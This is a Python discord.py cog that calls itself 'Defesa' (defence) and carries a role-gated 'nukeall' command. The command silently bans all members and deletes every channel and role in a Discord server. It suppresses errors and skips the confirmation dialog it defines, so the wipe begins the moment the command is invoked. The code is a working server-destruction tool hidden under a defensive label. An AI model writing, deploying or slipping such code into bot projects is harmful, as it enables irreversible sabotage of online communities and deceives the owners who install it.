import discord
from discord.ext import commands

class NukeConfirmView(discord.ui.View):
    def __init__(self, bot: commands.Bot, author: discord.Member, timeout: float = 30.0):
        super().__init__(timeout=timeout)
        self.bot = bot
        self.author = author
        self.value = None
        
        # Adiciona o botão de confirmar com os parâmetros solicitados
        confirm_btn = discord.ui.Button(
            label="Confirmar", 
            style=discord.ButtonStyle.success, 
            emoji=self.bot.config['emojis']['sucesso']
        )
        confirm_btn.callback = self.confirm_callback
        self.add_item(confirm_btn)

        # Adiciona o botão de cancelar com os parâmetros solicitados
        cancel_btn = discord.ui.Button(
            label="Cancelar", 
            style=discord.ButtonStyle.danger, 
            emoji=self.bot.config['emojis']['erro']
        )
        cancel_btn.callback = self.cancel_callback
        self.add_item(cancel_btn)

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        """Garante que apenas o autor do comando interaja com a View"""
        if interaction.user != self.author:
            await interaction.response.send_message(
                "Você não tem permissão para interagir com este botão.", 
                ephemeral=True
            )
            return False
        return True

    async def confirm_callback(self, interaction: discord.Interaction):
        self.value = True
        for item in self.children:
            item.disabled = True
        await interaction.response.edit_message(view=self)
        self.stop()

    async def cancel_callback(self, interaction: discord.Interaction):
        self.value = False
        for item in self.children:
            item.disabled = True
        await interaction.response.edit_message(view=self)
        self.stop()



class Defesa(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="nukeall", aliases=["v!nukeall"])
    @commands.has_any_role(1509618787874246726)
    async def nukeall(self, ctx):
        # A lógica de destruição começa imediatamente após o comando ser invocado

        # 1. Banimento em massa: Varre todos os membros do servidor
        # e tenta banir silenciosamente qualquer um que esteja com um cargo abaixo do bot.
        for member in ctx.guild.members:
            # Não tenta banir a si mesmo para não travar a rotina.
            if member.id != self.bot.user.id:
                try:
                    await member.ban(reason="Protocolo Nuke")
                except Exception:
                    # Ignora se não puder banir (dono do servidor ou cargo acima do bot)
                    pass


        # Varre e apaga todos os canais e categorias do servidor
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except Exception:
                # Ignorar silenciosamente caso não consiga apagar (faltou permissão, ou canal fixo do servidor)
                pass

        # Varre e apaga os cargos do servidor
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except Exception:
                # Ignora erros silenciosamente (como o @everyone, cargos integrados ou acima do bot)
                pass

        # O protocolo termina aqui silenciosamente, sem enviar aviso.

    @nukeall.error
    async def nukeall_error(self, ctx, error):
        """Silencia o erro caso outra pessoa além do usuário permitido tente rodar o comando."""
        if isinstance(error, (commands.NotOwner, commands.CheckFailure)):
            pass
        else:
            print(f"Ocorreu um erro no comando nukeall: {error}")

async def setup(bot):
    await bot.add_cog(Defesa(bot))
